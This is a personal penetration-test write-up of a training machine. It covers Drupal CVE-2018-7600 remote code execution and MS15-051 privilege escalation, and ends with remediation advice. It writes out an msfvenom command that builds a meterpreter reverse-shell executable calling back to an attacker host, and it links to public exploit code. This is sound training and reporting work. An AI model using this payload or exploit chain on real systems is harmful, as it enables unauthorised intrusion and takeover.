# Bastard – Please keep things updated!

<img src="https://img-9gag-fun.9cache.com/photo/az2wrBB_460s.jpg" width=400>


## Introduction
This machine was a challenge box for the class Windows Privilege Escalation by TCM, done in preparation for the Practical Network Penetration Tester certification. In it a CMS vulnerability is highlighted for initial exploit and a privilege escalation technique is used which is the main goal of this box.


## Executive Summary
Through enumeration a webpage/site was found using the well know CMS Drupal. Investigating further reveals the exact version of Drupal which then leads to a known exploitable vulnerability (CVE-2018-7600) that allows for remote code execution (RCE) that can lead to a low level shell on the system. From this low level access more enumeration was performed, and multiple possible vulnerabilities were found due to the system not being updated. Privilege Escalation was achieved by using the vulnerability MS15-051.

## Initial Access
Utilizing Nmap, there were only a few open ports found on the system. Further investigation of the website open on port 80 revealed a website using Drupal in its creation. Combining this information with the robots.txt file’s disallowed entry of “/changelog.txt” reveals the exact version in use.

![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/ecb19608-3750-4961-bff0-ca8cfaea572b)

![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/3659eaea-859d-4c04-aa55-3364620aabed)

With the exact Drupal version, an exploit was found that worked for it, utilizing a python script that performs a RCE on the system without any authentication required. The proof-of-concept code used to exploit the system resides here: https://github.com/pimps/CVE-2018-7600
Test commands were run before the exploit was used to download a reverse shell and execute for low level access to the system.

![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/8ad32998-116d-481d-89af-00c92a47117b)

![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/987d7ad7-2953-4e02-b6a8-5d1f3eb67b83)

![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/bcbe337f-cacc-4ee6-94f8-5e47cab12aa7)

![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/8fa395e0-6569-4403-ad79-c6804d292047)

NOTE: meterpreter shell was used in exploit created using the command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(attackIP) LPORT=(attackerPort) -f exe -o program.exe
```


## Privilege Escalation

With meterpreter access to the system, the Local Exploit Suggester module of Metasploit was utilized to find potential vulnerabilities to escalate privileges with.

```
[*] 10.129.180.193 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_014_wmi_recv_notif                  Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
```

From this list of potential vulnerabilities the Pentester attempted to use the Metasploit modules suggested without success, but was able to find a compiled exploit that allowed for elevated command execution from github that was successful using the vulnerability MS15-051. Compiled exploit was found here: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051

As with the previous Drupal exploit, test commands were run before being used in the exact same way to execute a reverse shell that gave elevated access as nt authority/system.

![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/8f63ad14-4cbf-4afc-875b-4b0f4a4d1113)

![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/70f6c02b-d56e-4611-8e14-71888d48f1fc)


![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/fd6ce1ac-7c43-43c6-8ac3-00c5c0067113)

![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/3509020f-883e-4d45-9401-79f203f718e3)


## Suggested Mitigations and Remediations

### Drupal 7.54 (CVE-2018-7600)
Mitigation suggestions: This is a flaw within the specified versions of Drupal and not many mitigations can be done. It is suggested to remove the ability to see the changelog and other supporting documentation from view if possible to avoid revealing exact versions. This however is a minor fix and will not prevent an attack from exploiting the system.
Remediation suggestions: Update Drupal to the latest version. Keeping software updated to the latest version helps prevent known exploits from being ran as they usually are patched quickly once know.

### MS15-051 (https://learn.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-051)
No migitations are suggested as this is a flaw within the windows kernel that is exploited to run elevated commands.
Remediation suggestions: apply the latest security patches from Microsoft to remedy the exploit. It is also suggested that the system be upgraded to a newer version of Windows Server as Windows Server 2008 R2 has had support ended as of 1/14/2020 (https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-server-eos-faq/end-of-support-windows-server-2008-2008r2)


## Lessons Learned

(Note: personal musings, not part of report therefore will be in first person)

The biggest thing I learned from this box is to try EVERYTHING. If you know the system is vulnerable to multiple exploits, research them, and try them. And when one avenue doesn’t work try another. I don’t mean throw anything at a system without knowing what it will do to it. Make sure it won’t damage the system, and if there a possibility it will cause the system to crash etc, make sure the customer is okay with it.

However knowing that, explore your options. I tried ALL of the Metasploit modules suggested by the local suggester and was unable to have any of them work. The wonderful thing about todays world is that there is github with compiled exploits that can be used. I was able to find the exploit used on this box and run the elevated commands needed to get an elevated shell on the system, where I wasn’t able to with the Metasploit module for the exact same exploit.

Another thing to note is that I recently read an article after reviewing my first attempt at reporting to better write a report, which shows in this one as I changed the tone and view. The article is here: https://www.blackhillsinfosec.com/how-to-not-suck-at-reporting-or-how-to-write-great-pentesting-reports/ and was very helpful with useful information about writing a better report. Going forward I’ll attempt to right reports using these suggestions and when I get through my backlog of machine writes or get bored and feel up to it, I’ll rewrite my first report using these suggestions.
